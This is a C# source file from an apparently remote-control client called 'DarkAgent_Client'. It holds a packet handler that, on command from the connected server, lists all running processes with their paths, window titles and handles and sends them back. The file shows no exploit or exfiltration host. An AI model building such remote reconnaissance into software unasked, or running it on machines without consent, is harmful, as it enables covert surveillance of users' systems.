using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Network.DataNetwork.Packets;
using DarkAgent_Client.src.Network.DataNetwork;
using System.Diagnostics;
using DarkAgent_Client.src.Objects;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_GetProcesses : ReceiveBasePacket
    {
        public R_GetProcesses(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        public override void Read()
        {

        }

        public override void Run()
        {
            Process[] myProcesses;
            myProcesses = Process.GetProcesses();

            foreach (Process proc in myProcesses)
            {
                ProcessInfo inf = new ProcessInfo();

                try { inf.ProcessName = proc.ProcessName; }
                catch { inf.ProcessName = ""; }

                try { inf.PID = proc.Id; }
                catch { inf.PID = 0; }

                try { inf.WindowsTitle = proc.MainWindowTitle.ToString(); }
                catch { inf.WindowsTitle = ""; }

                try
                {
                    if (proc.Responding)
                        inf.Responding = 1;
                    else
                        inf.Responding = 0;
                }
                catch { inf.Responding = 0; }

                try { inf.FileLocation = proc.MainModule.FileName.ToString(); }
                catch { inf.FileLocation = ""; }

                try { inf.Handle = (int)proc.Handle; }
                catch { inf.Handle = 0; }

                try { inf.ProcessorAffinity = (int)proc.ProcessorAffinity; }
                catch { inf.ProcessorAffinity = 0; }

                try { inf.Threads = proc.Threads.Count; }
                catch { inf.Threads = 0; }

                try
                {
                    inf.Priority = (byte)proc.BasePriority;
                }
                catch { inf.Priority = 0; }

                Client.SendPacket(new S_GetProcesses(Client, inf));
            }
        }
    }
}
